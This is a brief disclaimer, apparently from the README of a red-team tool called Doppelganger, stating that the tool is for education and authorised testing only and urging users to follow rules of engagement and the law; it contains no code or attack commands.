> ⚠️ **This tool is provided strictly for educational purposes and authorized red team operations.**

Unauthorized use against systems you do not own or have explicit permission to test is **illegal** and unethical.

- **Do not deploy Doppelganger in production environments unless explicitly authorized.**
- **Always follow your organization’s rules of engagement (ROE) and local laws.**
- The author is not responsible for misuse, abuse, or any damages resulting from this tool.

Use responsibly. Learn deeply. Red team ethically.

